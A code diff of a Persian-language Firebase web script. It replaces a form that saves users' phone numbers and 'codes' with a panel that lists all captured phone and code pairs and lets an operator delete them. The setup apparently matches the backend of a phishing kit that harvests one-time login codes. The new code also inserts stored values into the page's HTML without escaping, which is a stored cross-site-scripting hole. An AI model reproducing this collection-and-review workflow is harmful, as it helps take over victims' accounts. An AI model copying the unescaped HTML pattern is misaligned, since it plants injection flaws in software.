@@ -1,5 +1,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
-import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+
 
 const firebaseConfig = {
   apiKey: "AIzaSyAUPnkLgHdNw2jXRe76gQ113_6aCiAFtXo",
@@ -8,30 +9,71 @@ const firebaseConfig = {
   projectId: "la3nazr",
   storageBucket: "la3nazr.firebasestorage.app",
   messagingSenderId: "819824551752",
-  appId: "1:819824551752:web:87e8a2555c6df97edeb57d"
+  appId: "1:819824551752:web:87e8a2555c6df97edeb57d",
+  measurementId: "G-F9F9YTF2HC"
 };
+
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
 
-window.saveInfo = function(){
-
-let phone = document.getElementById("phone").value;
-let code = document.getElementById("code").value;
-
-if(phone=="" || code==""){
-alert("اطلاعات را کامل کنید");
-return;
-}
+const usersRef = ref(db, "users");
 
 
-push(ref(db,"users"),{
-phone:phone,
-code:code,
-time:new Date().toLocaleString()
+onValue(usersRef, (snapshot)=>{
+
+    let data = snapshot.val();
+
+    let box = document.getElementById("users");
+
+    box.innerHTML = "";
+
+
+    if(data){
+
+        Object.keys(data).forEach(id=>{
+
+            let user = data[id];
+
+
+            box.innerHTML += `
+
+            <div class="user">
+
+            <p>📱 شماره: ${user.phone}</p>
+
+            <p>🔑 کد: ${user.code}</p>
+
+            <p>⏰ زمان: ${user.time}</p>
+
+
+            <button onclick="deleteUser('${id}')">
+            حذف
+            </button>
+
+            </div>
+
+            `;
+
+        });
+
+    }else{
+
+        box.innerHTML="اطلاعاتی وجود ندارد";
+
+    }
+
+
 });
 
 
-alert("ثبت شد");
-};
+window.deleteUser = function(id){
+
+    if(confirm("حذف شود؟")){
+
+        remove(ref(db,"users/"+id));
+
+    }
+
+                                  }
